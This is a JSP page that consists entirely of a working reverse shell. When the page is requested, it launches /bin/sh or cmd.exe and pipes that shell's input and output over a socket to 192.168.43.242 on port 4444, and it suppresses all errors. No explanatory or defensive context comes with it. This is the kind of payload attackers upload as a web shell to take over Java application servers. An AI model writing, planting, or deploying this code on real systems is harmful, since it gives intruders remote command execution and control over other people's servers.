<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream ck;
    OutputStream zl;

    StreamConnector( InputStream ck, OutputStream zl )
    {
      this.ck = ck;
      this.zl = zl;
    }

    public void run()
    {
      BufferedReader ov  = null;
      BufferedWriter hgi = null;
      try
      {
        ov  = new BufferedReader( new InputStreamReader( this.ck ) );
        hgi = new BufferedWriter( new OutputStreamWriter( this.zl ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ov.read( buffer, 0, buffer.length ) ) > 0 )
        {
          hgi.write( buffer, 0, length );
          hgi.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ov != null )
          ov.close();
        if( hgi != null )
          hgi.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.43.242", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
